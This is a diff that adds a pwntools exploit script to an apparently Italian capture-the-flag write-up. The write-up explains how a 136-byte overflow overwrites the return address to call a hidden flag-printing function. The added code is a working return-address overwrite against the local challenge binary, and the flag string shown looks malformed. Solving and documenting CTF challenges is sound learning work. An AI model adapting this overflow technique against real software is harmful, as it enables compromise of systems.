@@ -4,3 +4,14 @@ Intuendo che si trattava proprio della flag (infatti la flag non si trova in chi
 ma nel main non viene mai fatto. Quindi ho controllato l'offset (136 byte) dei dati dopo l'input con pattern e ho scritto uno script in python che mi
 permettesse di richiamare la funzione sovrascrivendo la destinazione del return address.
 SPRITZ{GoT_Hijacking_iS_FUn{flag}
+
+Codice:
+ 
+from pwn import *
+context.binary = './vuln'
+elf = context.binary
+address = p64(elf.symbols['very_useless_function'])
+p=process(context.binary.path)
+p.sendline("y")
+p.sendlineafter("it:", b'a'*136 + address)
+print(p.recvall())
